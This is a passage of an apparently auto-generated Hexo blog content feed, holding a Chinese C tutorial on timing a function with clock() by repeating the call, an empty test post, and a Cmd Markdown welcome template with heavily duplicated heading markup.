class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>下面是一个具体的例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">clock_t</span> start, stop;</span><br><span class="line"><span class="type">double</span> duration;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n, <span class="type">double</span> a[], <span class="type">double</span> x)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">double</span> a[MAXN];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXN; i++)  a[i] = (<span class="type">double</span>)i;</span><br><span class="line"></span><br><span class="line">    start = clock();</span><br><span class="line">    f(MAXN - <span class="number">1</span>, a, <span class="number">1.1</span>);</span><br><span class="line">    stop = clock();</span><br><span class="line">    duration = ((<span class="type">double</span>)(stop - start)) / CLK_TCK;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ticks=%f\n&quot;</span>, (<span class="type">double</span>)(stop - start));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;duration=%6.2e\n&quot;</span>, duration);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n, <span class="type">double</span> a[], <span class="type">double</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">double</span> p = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        p += (a[i] * <span class="built_in">pow</span>(x,i));</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>计算结果都是0，是因为这个函数跑的实在是太快了，它的运行时间不到一个tick，所以clock函数铺捉不到它。解决方法就是让被测函数<strong>重复运行</strong>充分多次，使得测出的总的时钟打点间隔充分长，最后计算被测函数<strong>平均每次</strong>运行的时间即可。</p>
<p>调整后的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">clock_t</span> start, stop;</span><br><span class="line"><span class="type">double</span> duration;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXK 1e7<span class="comment">/*被测函数最大重复调用次数*/</span></span></span><br><span class="line"><span class="type">double</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n, <span class="type">double</span> a[], <span class="type">double</span> x)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">double</span> a[MAXN];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXN; i++)  a[i] = (<span class="type">double</span>)i;</span><br><span class="line"></span><br><span class="line">    start = clock();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=MAXK;i++)<span class="comment">/*重复调用函数已获得充分多的时钟打点数*/</span></span><br><span class="line">        f(MAXN - <span class="number">1</span>, a, <span class="number">1.1</span>);</span><br><span class="line">    stop = clock();</span><br><span class="line">    duration = ((<span class="type">double</span>)(stop - start)) / CLK_TCK/MAXK;<span class="comment">/*计算函数单次运行的时间*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ticks=%f\n&quot;</span>, (<span class="type">double</span>)(stop - start));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;duration=%6.2e\n&quot;</span>, duration);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n, <span class="type">double</span> a[], <span class="type">double</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">double</span> p = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        p += (a[i] * <span class="built_in">pow</span>(x,i));</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个数据在不同的电脑上运行出来的结果不同，因为不同机器的CLK_TCK不一定相同</p>
<p><img src="/image/clock/1677666755946.png" alt="1677666755946"></p>
]]></content>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2023/01/29/test/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>test</tag>
      </tags>
  </entry>
  <entry>
    <title>My New post</title>
    <url>/2023/01/27/My-New-Post/</url>
    <content><![CDATA[<h1 id="欢迎使用-Cmd-Markdown-编辑阅读器"><a href="#欢迎使用-Cmd-Markdown-编辑阅读器" class="headerlink" title="欢迎使用 Cmd Markdown 编辑阅读器"></a>欢迎使用 Cmd Markdown 编辑阅读器</h1><hr>
<p>我们理解您需要更便捷更高效的工具记录思想，整理笔记、知识，并将其中承载的价值传播给他人，<strong>Cmd Markdown</strong> 是我们给出的答案 —— 我们为记录思想和分享知识提供更专业的工具。 您可以使用 Cmd Markdown：</p>
<blockquote>
<ul>
<li>整理知识，学习笔记</li>
<li>发布日记，杂文，所见所想</li>
<li>撰写发布技术文稿（代码支持）</li>
<li>撰写发布学术论文（LaTeX 公式支持）<span id="more"></span>
<img src="https://www.zybuluo.com/static/img/logo.png" alt="cmd-markdown-logo"></li>
</ul>
</blockquote>
<h2 id="除了您现在看到的这个-Cmd-Markdown-在线版本，您还可以前往以下网址下载：-Windows-x2F-Mac-x2F-Linux-全平台客户端-gt-请保留此份-Cmd-Markdown-的欢迎稿兼使用说明，如需撰写新稿件，点击顶部工具栏右侧的-新文稿-或者使用快捷键-Ctrl-Alt-N。"><a href="#除了您现在看到的这个-Cmd-Markdown-在线版本，您还可以前往以下网址下载：-Windows-x2F-Mac-x2F-Linux-全平台客户端-gt-请保留此份-Cmd-Markdown-的欢迎稿兼使用说明，如需撰写新稿件，点击顶部工具栏右侧的-新文稿-或者使用快捷键-Ctrl-Alt-N。" class="headerlink" title="除了您现在看到的这个 Cmd Markdown 在线版本，您还可以前往以下网址下载：### Windows&#x2F;Mac&#x2F;Linux 全平台客户端&gt; 请保留此份 Cmd Markdown 的欢迎稿兼使用说明，如需撰写新稿件，点击顶部工具栏右侧的  新文稿 或者使用快捷键 Ctrl+Alt+N。
 "></a>除了您现在看到的这个 Cmd Markd<!-- more -->own 在线版本，您还可以前往以下网址下载：<br><br>### <a href="https://www.zybuluo.com/cmd/">Windows&#x2F;Mac&#x2F;Linux 全平台客户端</a><br><br>&gt; 请保留此份 Cmd Markdown 的欢迎稿兼使用说明，如需撰写新稿件，点击顶部工具栏右侧的 <i class="icon-file"></i> <strong>新文稿</strong> 或者使用快捷键 <code>Ctrl+Alt+N</code>。
 </h2><h2 id="什么是-Markdown"><a href="#什么是-Markdown" class="headerlink" title="什么是 Markdown"></a>什么是 Markdown</h2><h2 id="Markdown-是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，粗体-或者-斜体-某些文字，更棒的是，它还可以-1-制作一份待办事宜-Todo-列表-支持以-PDF-格式导出文稿-改进-Cmd-渲染算法，使用局部渲染技术提高渲染效率-x-新增-Todo-列表功能-x-修复-LaTex-公式渲染问题-x-新增-LaTex-公式编号功能-2-书写一个质能守恒公式-LaTeX-E-x3D-mc-2-3-高亮一段代码-code-4-高效绘制-流程图-5-高效绘制-序列图-6-高效绘制-甘特图-7-绘制表格-项目-价格-数量-——–-—–-—-计算机-1600-5-手机-12-12-管线-1-234-8-更详细语法说明想要查看更详细的语法说明，可以参考我们准备的-Cmd-Markdown-简明语法手册，进阶用户可以参考-Cmd-Markdown-高阶语法手册-了解更多高级功能。总而言之，不同于其它-所见即所得-的编辑器：你只需使用键盘专注于书写文本内容，就可以生成印刷级的排版格式，省却在键盘和工具栏之间来回切换，调整内容和格式的麻烦。Markdown-在流畅的书写和印刷级的阅读体验之间找到了平衡。-目前它已经成为世界上最大的技术分享网站-GitHub-和-技术问答网站-StackOverFlow-的御用书写格式。"><a href="#Markdown-是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，粗体-或者-斜体-某些文字，更棒的是，它还可以-1-制作一份待办事宜-Todo-列表-支持以-PDF-格式导出文稿-改进-Cmd-渲染算法，使用局部渲染技术提高渲染效率-x-新增-Todo-列表功能-x-修复-LaTex-公式渲染问题-x-新增-LaTex-公式编号功能-2-书写一个质能守恒公式-LaTeX-E-x3D-mc-2-3-高亮一段代码-code-4-高效绘制-流程图-5-高效绘制-序列图-6-高效绘制-甘特图-7-绘制表格-项目-价格-数量-——–-—–-—-计算机-1600-5-手机-12-12-管线-1-234-8-更详细语法说明想要查看更详细的语法说明，可以参考我们准备的-Cmd-Markdown-简明语法手册，进阶用户可以参考-Cmd-Markdown-高阶语法手册-了解更多高级功能。总而言之，不同于其它-所见即所得-的编辑器：你只需使用键盘专注于书写文本内容，就可以生成印刷级的排版格式，省却在键盘和工具栏之间来回切换，调整内容和格式的麻烦。Markdown-在流畅的书写和印刷级的阅读体验之间找到了平衡。-目前它已经成为世界上最大的技术分享网站-GitHub-和-技术问答网站-StackOverFlow-的御用书写格式。" class="headerlink" title="Markdown 是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，粗体 或者 斜体 某些文字，更棒的是，它还可以### 1. 制作一份待办事宜 Todo 列表- [ ] 支持以 PDF 格式导出文稿- [ ] 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率- [x] 新增 Todo 列表功能- [x] 修复 LaTex 公式渲染问题- [x] 新增 LaTex 公式编号功能### 2. 书写一个质能守恒公式[^LaTeX]$$E&#x3D;mc^2$$### 3. 高亮一段代码[^code]### 4. 高效绘制 流程图### 5. 高效绘制 序列图### 6. 高效绘制 甘特图### 7. 绘制表格| 项目        | 价格   |  数量  || ——–   | —–:  | :—-:  || 计算机     | $1600 |   5     || 手机        |   $12   |   12   || 管线        |    $1    |  234  |### 8. 更详细语法说明想要查看更详细的语法说明，可以参考我们准备的 Cmd Markdown 简明语法手册，进阶用户可以参考 Cmd Markdown 高阶语法手册 了解更多高级功能。总而言之，不同于其它 所见即所得 的编辑器：你只需使用键盘专注于书写文本内容，就可以生成印刷级的排版格式，省却在键盘和工具栏之间来回切换，调整内容和格式的麻烦。Markdown 在流畅的书写和印刷级的阅读体验之间找到了平衡。 目前它已经成为世界上最大的技术分享网站 GitHub 和 技术问答网站 StackOverFlow 的御用书写格式。
 "></a>Markdown 是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，<strong>粗体</strong> 或者 <em>斜体</em> 某些文字，更棒的是，它还可以<br><br>### 1. 制作一份待办事宜 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#13-%E5%BE%85%E5%8A%9E%E4%BA%8B%E5%AE%9C-todo-%E5%88%97%E8%A1%A8">Todo 列表</a><br><br>- [ ] 支持以 PDF 格式导出文稿<br>- [ ] 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率<br>- [x] 新增 Todo 列表功能<br>- [x] 修复 LaTex 公式渲染问题<br>- [x] 新增 LaTex 公式编号功能<br><br>### 2. 书写一个质能守恒公式[^LaTeX]<br><br>$$E&#x3D;mc^2$$<br><br>### 3. 高亮一段代码[^code]<br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@requires_authorization</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SomeClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># A comment</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;hello world&#x27;</span></span><br></pre></td></tr></table></figure><br><br>### 4. 高效绘制 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#7-%E6%B5%81%E7%A8%8B%E5%9B%BE">流程图</a><br><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">st=&gt;start: Start</span><br><span class="line">op=&gt;operation: Your Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line">e=&gt;end</span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br></pre></td></tr></table></figure><br><br>### 5. 高效绘制 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#8-%E5%BA%8F%E5%88%97%E5%9B%BE">序列图</a><br><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice-&gt;Bob: Hello Bob, how are you?</span><br><span class="line">Note right of Bob: Bob thinks</span><br><span class="line">Bob--&gt;Alice: I am good thanks!</span><br></pre></td></tr></table></figure><br><br>### 6. 高效绘制 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#9-%E7%94%98%E7%89%B9%E5%9B%BE">甘特图</a><br><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title 项目开发流程</span><br><span class="line">section 项目确定</span><br><span class="line">    需求分析       :a1, 2016-06-22, 3d</span><br><span class="line">    可行性报告     :after a1, 5d</span><br><span class="line">    概念验证       : 5d</span><br><span class="line">section 项目实施</span><br><span class="line">    概要设计      :2016-07-05  , 5d</span><br><span class="line">    详细设计      :2016-07-08, 10d</span><br><span class="line">    编码          :2016-07-15, 10d</span><br><span class="line">    测试          :2016-07-22, 5d</span><br><span class="line">section 发布验收</span><br><span class="line">    发布: 2d</span><br><span class="line">    验收: 3d</span><br></pre></td></tr></table></figure><br><br>### 7. 绘制表格<br><br>| 项目        | 价格   |  数量  |<br>| ——–   | —–:  | :—-:  |<br>| 计算机     | $1600 |   5     |<br>| 手机        |   $12   |   12   |<br>| 管线        |    $1    |  234  |<br><br>### 8. 更详细语法说明<br><br>想要查看更详细的语法说明，可以参考我们准备的 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown">Cmd Markdown 简明语法手册</a>，进阶用户可以参考 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#cmd-markdown-%E9%AB%98%E9%98%B6%E8%AF%AD%E6%B3%95%E6%89%8B%E5%86%8C">Cmd Markdown 高阶语法手册</a> 了解更多高级功能。<br><br>总而言之，不同于其它 <em>所见即所得</em> 的编辑器：你只需使用键盘专注于书写文本内容，就可以生成印刷级的排版格式，省却在键盘和工具栏之间来回切换，调整内容和格式的麻烦。<strong>Markdown 在流畅的书写和印刷级的阅读体验之间找到了平衡。</strong> 目前它已经成为世界上最大的技术分享网站 GitHub 和 技术问答网站 StackOverFlow 的御用书写格式。
 </h2><h2 id="什么是-Cmd-Markdown"><a href="#什么是-Cmd-Markdown" class="headerlink" title="什么是 Cmd Markdown"></a>什么是 Cmd Markdown</h2><h2 id="您可以使用很多工具书写-Markdown，但是-Cmd-Markdown-是这个星球上我们已知的、最好的-Markdown-工具——没有之一-：）因为深信文字的力量，所以我们和你一样，对流畅书写，分享思想和知识，以及阅读体验有极致的追求，我们把对于这些诉求的回应整合在-Cmd-Markdown，并且一次，两次，三次，乃至无数次地提升这个工具的体验，最终将它演化成一个-编辑-x2F-发布-x2F-阅读-Markdown-的在线平台——您可以在任何地方，任何系统-x2F-设备上管理这里的文字。-1-实时同步预览我们将-Cmd-Markdown-的主界面一分为二，左边为编辑区，右边为预览区，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，我们有一个巧妙的算法把另一个区的滚动条同步到等价的位置，超酷！-2-编辑工具栏也许您还是一个-Markdown-语法的新手，在您完全熟悉它之前，我们在-编辑区-的顶部放置了一个如下图所示的工具栏，您可以使用鼠标在工具栏上调整格式，不过我们仍旧鼓励你使用键盘标记格式，提高书写的流畅度。-3-编辑模式完全心无旁骛的方式编辑文字：点击-编辑工具栏-最右侧的拉伸按钮或者按下-Ctrl-M，将-Cmd-Markdown-切换到独立的编辑模式，这是一个极度简洁的写作环境，所有可能会引起分心的元素都已经被挪除，超清爽！-4-实时的云端文稿为了保障数据安全，Cmd-Markdown-会将您每一次击键的内容保存至云端，同时在-编辑工具栏-的最右侧提示-已保存-的字样。无需担心浏览器崩溃，机器掉电或者地震，海啸——在编辑的过程中随时关闭浏览器或者机器，下一次回到-Cmd-Markdown-的时候继续写作。-5-离线模式在网络环境不稳定的情况下记录文字一样很安全！在您写作的时候，如果电脑突然失去网络连接，Cmd-Markdown-会智能切换至离线模式，将您后续键入的文字保存在本地，直到网络恢复再将他们传送至云端，即使在网络恢复前关闭浏览器或者电脑，一样没有问题，等到下次开启-Cmd-Markdown-的时候，她会提醒您将离线保存的文字传送至云端。简而言之，我们尽最大的努力保障您文字的安全。-6-管理工具栏为了便于管理您的文稿，在-预览区-的顶部放置了如下所示的-管理工具栏：通过管理工具栏可以：-发布：将当前的文稿生成固定链接，在网络上发布，分享-新建：开始撰写一篇新的文稿-删除：删除当前的文稿-导出：将当前的文稿转化为-Markdown-文本或者-Html-格式，并导出到本地-列表：所有新增和过往的文稿都可以在这里查看、操作-模式：切换-普通-x2F-Vim-x2F-Emacs-编辑模式-7-阅读工具栏通过-预览区-右上角的-阅读工具栏，可以查看当前文稿的目录并增强阅读体验。工具栏上的五个图标依次为：-目录：快速导航当前文稿的目录结构以跳转到感兴趣的段落-视图：互换左边编辑区和右边预览区的位置-主题：内置了黑白两种模式的主题，试试-黑色主题，超炫！-阅读：心无旁骛的阅读模式提供超一流的阅读体验-全屏：简洁，简洁，再简洁，一个完全沉浸式的写作和阅读环境-8-阅读模式在-阅读工具栏-点击-或者按下-Ctrl-Alt-M-随即进入独立的阅读模式界面，我们在版面渲染上的每一个细节：字体，字号，行间距，前背景色都倾注了大量的时间，努力提升阅读的体验和品质。-9-标签、分类和搜索在编辑区任意行首位置输入以下格式的文字可以标签当前文档：标签：-未分类标签以后的文稿在【文件列表】（Ctrl-Alt-F）里会按照标签分类，用户可以同时使用键盘或者鼠标浏览查看，或者在【文件列表】的搜索文本框内搜索标题关键字过滤文稿，如下图所示：-10-文稿发布和分享在您使用-Cmd-Markdown-记录，创作，整理，阅读文稿的同时，我们不仅希望它是一个有力的工具，更希望您的思想和知识通过这个平台，连同优质的阅读体验，将他们分享给有相同志趣的人，进而鼓励更多的人来到这里记录分享他们的思想和知识，尝试点击-Ctrl-Alt-P-发布这份文档给好友吧！"><a href="#您可以使用很多工具书写-Markdown，但是-Cmd-Markdown-是这个星球上我们已知的、最好的-Markdown-工具——没有之一-：）因为深信文字的力量，所以我们和你一样，对流畅书写，分享思想和知识，以及阅读体验有极致的追求，我们把对于这些诉求的回应整合在-Cmd-Markdown，并且一次，两次，三次，乃至无数次地提升这个工具的体验，最终将它演化成一个-编辑-x2F-发布-x2F-阅读-Markdown-的在线平台——您可以在任何地方，任何系统-x2F-设备上管理这里的文字。-1-实时同步预览我们将-Cmd-Markdown-的主界面一分为二，左边为编辑区，右边为预览区，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，我们有一个巧妙的算法把另一个区的滚动条同步到等价的位置，超酷！-2-编辑工具栏也许您还是一个-Markdown-语法的新手，在您完全熟悉它之前，我们在-编辑区-的顶部放置了一个如下图所示的工具栏，您可以使用鼠标在工具栏上调整格式，不过我们仍旧鼓励你使用键盘标记格式，提高书写的流畅度。-3-编辑模式完全心无旁骛的方式编辑文字：点击-编辑工具栏-最右侧的拉伸按钮或者按下-Ctrl-M，将-Cmd-Markdown-切换到独立的编辑模式，这是一个极度简洁的写作环境，所有可能会引起分心的元素都已经被挪除，超清爽！-4-实时的云端文稿为了保障数据安全，Cmd-Markdown-会将您每一次击键的内容保存至云端，同时在-编辑工具栏-的最右侧提示-已保存-的字样。无需担心浏览器崩溃，机器掉电或者地震，海啸——在编辑的过程中随时关闭浏览器或者机器，下一次回到-Cmd-Markdown-的时候继续写作。-5-离线模式在网络环境不稳定的情况下记录文字一样很安全！在您写作的时候，如果电脑突然失去网络连接，Cmd-Markdown-会智能切换至离线模式，将您后续键入的文字保存在本地，直到网络恢复再将他们传送至云端，即使在网络恢复前关闭浏览器或者电脑，一样没有问题，等到下次开启-Cmd-Markdown-的时候，她会提醒您将离线保存的文字传送至云端。简而言之，我们尽最大的努力保障您文字的安全。-6-管理工具栏为了便于管理您的文稿，在-预览区-的顶部放置了如下所示的-管理工具栏：通过管理工具栏可以：-发布：将当前的文稿生成固定链接，在网络上发布，分享-新建：开始撰写一篇新的文稿-删除：删除当前的文稿-导出：将当前的文稿转化为-Markdown-文本或者-Html-格式，并导出到本地-列表：所有新增和过往的文稿都可以在这里查看、操作-模式：切换-普通-x2F-Vim-x2F-Emacs-编辑模式-7-阅读工具栏通过-预览区-右上角的-阅读工具栏，可以查看当前文稿的目录并增强阅读体验。工具栏上的五个图标依次为：-目录：快速导航当前文稿的目录结构以跳转到感兴趣的段落-视图：互换左边编辑区和右边预览区的位置-主题：内置了黑白两种模式的主题，试试-黑色主题，超炫！-阅读：心无旁骛的阅读模式提供超一流的阅读体验-全屏：简洁，简洁，再简洁，一个完全沉浸式的写作和阅读环境-8-阅读模式在-阅读工具栏-点击-或者按下-Ctrl-Alt-M-随即进入独立的阅读模式界面，我们在版面渲染上的每一个细节：字体，字号，行间距，前背景色都倾注了大量的时间，努力提升阅读的体验和品质。-9-标签、分类和搜索在编辑区任意行首位置输入以下格式的文字可以标签当前文档：标签：-未分类标签以后的文稿在【文件列表】（Ctrl-Alt-F）里会按照标签分类，用户可以同时使用键盘或者鼠标浏览查看，或者在【文件列表】的搜索文本框内搜索标题关键字过滤文稿，如下图所示：-10-文稿发布和分享在您使用-Cmd-Markdown-记录，创作，整理，阅读文稿的同时，我们不仅希望它是一个有力的工具，更希望您的思想和知识通过这个平台，连同优质的阅读体验，将他们分享给有相同志趣的人，进而鼓励更多的人来到这里记录分享他们的思想和知识，尝试点击-Ctrl-Alt-P-发布这份文档给好友吧！" class="headerlink" title="您可以使用很多工具书写 Markdown，但是 Cmd Markdown 是这个星球上我们已知的、最好的 Markdown 工具——没有之一 ：）因为深信文字的力量，所以我们和你一样，对流畅书写，分享思想和知识，以及阅读体验有极致的追求，我们把对于这些诉求的回应整合在 Cmd Markdown，并且一次，两次，三次，乃至无数次地提升这个工具的体验，最终将它演化成一个 编辑&#x2F;发布&#x2F;阅读 Markdown 的在线平台——您可以在任何地方，任何系统&#x2F;设备上管理这里的文字。### 1. 实时同步预览我们将 Cmd Markdown 的主界面一分为二，左边为编辑区，右边为预览区，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，我们有一个巧妙的算法把另一个区的滚动条同步到等价的位置，超酷！### 2. 编辑工具栏也许您还是一个 Markdown 语法的新手，在您完全熟悉它之前，我们在 编辑区 的顶部放置了一个如下图所示的工具栏，您可以使用鼠标在工具栏上调整格式，不过我们仍旧鼓励你使用键盘标记格式，提高书写的流畅度。### 3. 编辑模式完全心无旁骛的方式编辑文字：点击 编辑工具栏 最右侧的拉伸按钮或者按下 Ctrl + M，将 Cmd Markdown 切换到独立的编辑模式，这是一个极度简洁的写作环境，所有可能会引起分心的元素都已经被挪除，超清爽！### 4. 实时的云端文稿为了保障数据安全，Cmd Markdown 会将您每一次击键的内容保存至云端，同时在 编辑工具栏 的最右侧提示 已保存 的字样。无需担心浏览器崩溃，机器掉电或者地震，海啸——在编辑的过程中随时关闭浏览器或者机器，下一次回到 Cmd Markdown 的时候继续写作。### 5. 离线模式在网络环境不稳定的情况下记录文字一样很安全！在您写作的时候，如果电脑突然失去网络连接，Cmd Markdown 会智能切换至离线模式，将您后续键入的文字保存在本地，直到网络恢复再将他们传送至云端，即使在网络恢复前关闭浏览器或者电脑，一样没有问题，等到下次开启 Cmd Markdown 的时候，她会提醒您将离线保存的文字传送至云端。简而言之，我们尽最大的努力保障您文字的安全。### 6. 管理工具栏为了便于管理您的文稿，在 预览区 的顶部放置了如下所示的 管理工具栏：通过管理工具栏可以： 发布：将当前的文稿生成固定链接，在网络上发布，分享 新建：开始撰写一篇新的文稿 删除：删除当前的文稿 导出：将当前的文稿转化为 Markdown 文本或者 Html 格式，并导出到本地 列表：所有新增和过往的文稿都可以在这里查看、操作 模式：切换 普通&#x2F;Vim&#x2F;Emacs 编辑模式### 7. 阅读工具栏通过 预览区 右上角的 阅读工具栏，可以查看当前文稿的目录并增强阅读体验。工具栏上的五个图标依次为： 目录：快速导航当前文稿的目录结构以跳转到感兴趣的段落 视图：互换左边编辑区和右边预览区的位置 主题：内置了黑白两种模式的主题，试试 黑色主题，超炫！ 阅读：心无旁骛的阅读模式提供超一流的阅读体验 全屏：简洁，简洁，再简洁，一个完全沉浸式的写作和阅读环境### 8. 阅读模式在 阅读工具栏 点击  或者按下 Ctrl+Alt+M 随即进入独立的阅读模式界面，我们在版面渲染上的每一个细节：字体，字号，行间距，前背景色都倾注了大量的时间，努力提升阅读的体验和品质。### 9. 标签、分类和搜索在编辑区任意行首位置输入以下格式的文字可以标签当前文档：标签： 未分类标签以后的文稿在【文件列表】（Ctrl+Alt+F）里会按照标签分类，用户可以同时使用键盘或者鼠标浏览查看，或者在【文件列表】的搜索文本框内搜索标题关键字过滤文稿，如下图所示：### 10. 文稿发布和分享在您使用 Cmd Markdown 记录，创作，整理，阅读文稿的同时，我们不仅希望它是一个有力的工具，更希望您的思想和知识通过这个平台，连同优质的阅读体验，将他们分享给有相同志趣的人，进而鼓励更多的人来到这里记录分享他们的思想和知识，尝试点击  (Ctrl+Alt+P) 发布这份文档给好友吧！
 "></a>您可以使用很多工具书写 Markdown，但是 Cmd Markdown 是这个星球上我们已知的、最好的 Markdown 工具——没有之一 ：）因为深信文字的力量，所以我们和你一样，对流畅书写，分享思想和知识，以及阅读体验有极致的追求，我们把对于这些诉求的回应整合在 Cmd Markdown，并且一次，两次，三次，乃至无数次地提升这个工具的体验，最终将它演化成一个 <strong>编辑&#x2F;发布&#x2F;阅读</strong> Markdown 的在线平台——您可以在任何地方，任何系统&#x2F;设备上管理这里的文字。<br><br>### 1. 实时同步预览<br><br>我们将 Cmd Markdown 的主界面一分为二，左边为<strong>编辑区</strong>，右边为<strong>预览区</strong>，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，我们有一个巧妙的算法把另一个区的滚动条同步到等价的位置，超酷！<br><br>### 2. 编辑工具栏<br><br>也许您还是一个 Markdown 语法的新手，在您完全熟悉它之前，我们在 <strong>编辑区</strong> 的顶部放置了一个如下图所示的工具栏，您可以使用鼠标在工具栏上调整格式，不过我们仍旧鼓励你使用键盘标记格式，提高书写的流畅度。<br><br><img src="https://www.zybuluo.com/static/img/toolbar-editor.png" alt="tool-editor"><br><br>### 3. 编辑模式<br><br>完全心无旁骛的方式编辑文字：点击 <strong>编辑工具栏</strong> 最右侧的拉伸按钮或者按下 <code>Ctrl + M</code>，将 Cmd Markdown 切换到独立的编辑模式，这是一个极度简洁的写作环境，所有可能会引起分心的元素都已经被挪除，超清爽！<br><br>### 4. 实时的云端文稿<br><br>为了保障数据安全，Cmd Markdown 会将您每一次击键的内容保存至云端，同时在 <strong>编辑工具栏</strong> 的最右侧提示 <code>已保存</code> 的字样。无需担心浏览器崩溃，机器掉电或者地震，海啸——在编辑的过程中随时关闭浏览器或者机器，下一次回到 Cmd Markdown 的时候继续写作。<br><br>### 5. 离线模式<br><br>在网络环境不稳定的情况下记录文字一样很安全！在您写作的时候，如果电脑突然失去网络连接，Cmd Markdown 会智能切换至离线模式，将您后续键入的文字保存在本地，直到网络恢复再将他们传送至云端，即使在网络恢复前关闭浏览器或者电脑，一样没有问题，等到下次开启 Cmd Markdown 的时候，她会提醒您将离线保存的文字传送至云端。简而言之，我们尽最大的努力保障您文字的安全。<br><br>### 6. 管理工具栏<br><br>为了便于管理您的文稿，在 <strong>预览区</strong> 的顶部放置了如下所示的 